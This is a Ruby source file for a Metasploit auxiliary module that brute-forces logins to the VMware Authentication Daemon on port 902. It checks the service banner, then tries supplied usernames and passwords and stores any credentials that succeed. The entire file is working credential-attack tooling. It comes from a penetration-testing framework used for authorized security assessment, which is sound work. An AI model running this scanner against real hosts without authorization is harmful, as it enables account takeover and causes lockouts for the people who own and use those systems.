##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/vmauthd'

class MetasploitModule < Msf::Auxiliary
  include Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name' => 'VMware Authentication Daemon Login Scanner',
      'Description' => %q{
        This module will test vmauthd logins on a range of machines and
        report successful logins.
      },
      'Author' => ['theLightCosine'],
      'References' => [
        [ 'CVE', '1999-0502'] # Weak password
      ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS, ACCOUNT_LOCKOUTS],
        'Reliability' => []
      }
    )

    register_options([Opt::RPORT(902)])
  end

  def run_host(ip)
    print_brute ip: ip, msg: 'Starting bruteforce'

    # Perform a sanity check to ensure that our target is vmauthd before
    # attempting to brute force it.
    begin
      begin
        connect
      rescue StandardError
        nil
      end

      if !sock
        print_brute(level: :verror, ip: ip, msg: 'Could not connect')
        return
      end

      banner = sock.get_once(-1, 10)

      if banner !~ /^220 VMware Authentication Daemon Version.*/
        print_brute(level: :verror, ip: ip, msg: 'Target does not appear to be a vmauthd service')
        return
      end
    rescue ::Interrupt
      raise $ERROR_INFO
    ensure
      disconnect
    end

    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )

    scanner = Metasploit::Framework::LoginScanner::VMAUTHD.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 30,
        max_send_size: datastore['TCP::max_send_size'],
        send_delay: datastore['TCP::send_delay'],
        framework: framework,
        framework_module: self,
        ssl: datastore['SSL'],
        ssl_version: datastore['SSLVersion'],
        ssl_verify_mode: datastore['SSLVerifyMode'],
        ssl_cipher: datastore['SSLCipher'],
        local_port: datastore['CPORT'],
        local_host: datastore['CHOST']
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute level: :good, ip: ip, msg: "Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        if datastore['VERBOSE']
          print_brute level: :verror, ip: ip, msg: 'Could not connect'
        end
        invalidate_login(credential_data)
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        if datastore['VERBOSE']
          print_brute level: :verror, ip: ip, msg: "Failed: '#{result.credential}' #{result.proof}"
        end
        invalidate_login(credential_data)
      end
    end
  end
end
